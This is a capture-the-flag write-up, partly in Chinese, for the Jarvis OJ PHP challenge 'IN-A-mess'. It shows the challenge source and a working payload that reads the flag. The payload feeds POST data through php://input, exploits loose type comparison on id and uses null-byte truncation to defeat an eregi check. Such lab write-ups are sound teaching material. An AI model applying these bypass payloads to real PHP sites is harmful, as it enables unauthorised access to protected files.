# Challenge
```php
<?php
error_reporting(0);
echo "<!--index.phps-->";
if(!$_GET['id'])
{
	header('Location: index.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'Hahahahahaha';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("flag.txt");
}
else
{
	print "work harder!harder!harder!";
}
?>
```

# Solution
php弱类型绕过。当`$a`为php://input，`$data`可以通过php://input来接受post数据。

`$id`传一个字符进去，满足`!$_GET['id']`为假。与数字进行比较时会被转换为0，满足`$id==0`。

对`$b`，要求长度大于5，其次要求满足`eregi`的要求和首字母不为4。可以设置`$b`为`%00111111`，这样，substr（）会发生截断，在匹配时时进行eregi("111","1114")满足，同时%00对strlen不会发生截断。

payload:
```
?id=a&a=php://input&b=%0011111

POST:
1112 is a nice lab!
```

# Refference 
+ [jarvisoj : IN-A-mess](http://web.jarvisoj.com:32780/index.php?id=1)
+ [chybeta : IN-A-mess](https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#IN-A-mess)